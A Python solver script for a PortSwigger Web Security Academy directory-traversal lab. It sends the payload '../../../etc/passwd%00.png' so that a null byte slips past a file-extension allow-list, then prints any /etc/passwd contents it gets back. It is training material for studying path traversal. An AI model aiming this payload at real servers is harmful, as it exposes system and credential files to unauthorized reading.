#!/usr/bin/env python3
"""
File path traversal, validation of file extension with null byte bypass
PortSwigger Web Security Academy -- Directory Traversal

Companion script for the writeup: 06-null-byte-bypass.md

What this does:
    Appends a literal null byte and an approved extension after a traversal
    chain, so the extension allow-list check sees ".png" while the
    filesystem stops reading at the null byte. httpx's params={} request
    builder would percent-encode the '%' in %00 into the inert string
    "%2500", destroying the null byte -- so the request is built as a raw
    URL string instead, exactly as PathTraversal.py's _send() does whenever
    a GET payload contains %00.

Usage:
    python 06-null-byte-bypass.py <lab-url>
    e.g. python 06-null-byte-bypass.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

UNIX_CONFIRM_REGEX = re.compile(r"root:.*:0:0:")


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    payload = "../../../etc/passwd%00.png"
    # Raw URL, not params={} -- params={} would re-encode %00 into %2500.
    r = client.get(f"{lab_url}/image?filename={payload}")
    print(f"[*] GET /image?filename={payload}")
    print(f"[*] Response status: {r.status_code}, length: {len(r.text)} bytes")

    if UNIX_CONFIRM_REGEX.search(r.text):
        print("[+] /etc/passwd read successfully:")
        print(r.text)
    else:
        print("[-] Response did not contain /etc/passwd content.")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- null byte truncated the filename before the .png extension.")
    else:
        print("[-] Not solved yet -- inspect the response body above.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
